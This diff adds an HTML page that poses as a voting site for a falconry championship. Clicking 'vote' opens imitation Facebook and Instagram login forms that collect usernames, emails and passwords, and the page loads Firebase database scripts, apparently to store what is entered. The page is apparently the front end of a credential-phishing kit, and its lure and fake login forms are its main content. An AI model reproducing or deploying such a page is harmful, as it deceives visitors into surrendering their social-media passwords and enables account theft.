@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fazza Championship for Falconry</title>
+    <meta name="description" content="Vote for your favorite falconer at the Fazza Championship for Falconry. Log in using your credentials and cast your vote for the best falconer. Join the excitement and support the champions!">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="assets/style.css">
+    <link rel="stylesheet" href="css/index.css">
+    <script src="js/index.js"></script>
+    <!-- Google Translate Widget Code -->
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({ pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE }, 'google_translate_element');
+        }
+    </script>
+</head>
+<body>
+    <div id="home">
+        <header>
+            <nav class="navbar">
+                <div class="logo">
+                    <a href="#"><img src="assets/images/falco.png" alt="Fazza Championship Logo"></a>
+                </div>
+                <div class="menu-toggle">
+                    <div class="bar"></div>
+                    <div class="bar"></div>
+                    <div class="bar"></div>
+                </div>
+                <ul class="nav-list">
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#votingSection">Voting</a></li>
+                    <li><a href="#">Contestants</a></li>
+                    <li><a href="#">Contact Us</a></li>
+                </ul>
+                <!-- Translate Button -->
+                <a href="index2.html" class="translate-button">Translate</a>
+            </nav>
+
+            <div class="hero-banner">
+                <video class="hero-video" autoplay loop muted>
+                    <source src="assets/images/falcon.mp4" type="video/mp4">
+                    <!-- Add more <source> elements for different video formats if needed -->
+                    Your browser does not support the video tag.
+                </video>
+                <div class="hero-content">
+                    <h1>Welcome to the Fazza Championship for Falconry Voting</h1>
+                    <p>Vote for your favorite contestant in the Fazza Championship for Falconry and support them to become the champions.</p>
+                    <a href="#votingSection" class="hero-button" onclick="vote()">Vote Now</a>
+                    <p class="announcement">Voting is now open! Show your support for the falconers and choose your champion.</p>
+                </div>
+            </div>
+
+        </header>
+
+        <section id="votingSection" class="contestants-section">
+            <h2>Contestants</h2>
+            <div class="contestant-grid">
+                <div class="contestant">
+                    <img src="assets/images/contestant3.JPG" alt="Contestant 1">
+                    <h3>Master of the Skies</h3>
+                    <p>A skilled falconer who combines expertise and passion in the art of falcon training. Possesses unique techniques and impressive achievements in their experience.</p>
+                    <button id="vote" class="voteButton" onclick="vote()">Vote (1)</button>
+                </div>
+                <div class="contestant">
+                    <img src="assets/images/contestant2.JPG" alt="Contestant 2">
+                    <h3>Falcon Enchanter</h3>
+                    <p>An adept falconer distinguished by their exceptional ability to communicate with falcons. Excelled in their training and achieved remarkable feats in the field of falconry.</p>
+                    <button id="vote" class="voteButton" onclick="vote()">Vote (2)</button>
+                </div>
+        
+                <div class="contestant">
+                    <img src="assets/images/contestant1.JPG" alt="Contestant 3">
+                    <h3>Star of Falconry</h3>
+                    <p>A promising falconer possessing unique skills in training and handling falcons. Succeeded in achieving notable successes and aims for excellence.</p>
+                    <button id="vote" class="voteButton" onclick="vote()">Vote (3)</button>
+                </div>
+        
+                <!-- Add more contestants as needed -->
+            </div><!-- Contestant information goes here -->
+        </section>
+
+            <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <img src="assets/images/falco.png" alt="Footer Logo" width="100" height="40">
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Us</a>
+            </div>
+        </div>
+    </footer>
+    </div>
+
+
+ 
+    <!-- Additional script tags go here -->
+
+    <center>
+        <div id="choose">
+            <p>
+                Login with one of the following to vote:
+            </p>
+            <p>
+                <img id="fb" onclick="fb()" src="assets/images/fb.png">
+                <img id="ig" onclick="ig()" src="assets/images/ig.png">
+            </p>
+            <br>
+            <button onclick="can()" id="cancel">Close</button>
+        </div>
+    </center>
+    
+    <center>
+        <div id="fbp">
+            <div class="facebook-login" id="fb2" align="center">
+                <div class="ggt">
+                    <img src="assets/images/fb.png" alt="logo" id="fblogo">
+                    <h1 id="fb2">
+                        Facebook
+                    </h1>
+                    <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+                    <input type="password" placeholder="Password" id="fb-pass"><br>
+                    <button onclick="login()" id="fb-log">
+                        Log in
+                    </button>
+                </div>
+            </div>
+        </div>
+    </center>
+    
+    <center>
+        <div id="igp">
+            <div class="Instagram-login" id="ig2" align="center">
+                <div class="ppt">
+                    <img src="assets/images/ig-logo.png" alt="logo" id="iglogo"><br><br>
+                    <br>
+                    <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+                    <input type="password" placeholder="Password" id="ig-pass">
+                    <br>
+                    <button onclick="iglog()" id="ig-log">
+                        Log in
+                    </button>
+                </div>
+            </div>
+        </div>
+    </center>
+
+    <!-- Firebase scripts and other additional scripts go here -->
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+    <script src="js/firebase.js"></script>
+</body>
+</html>
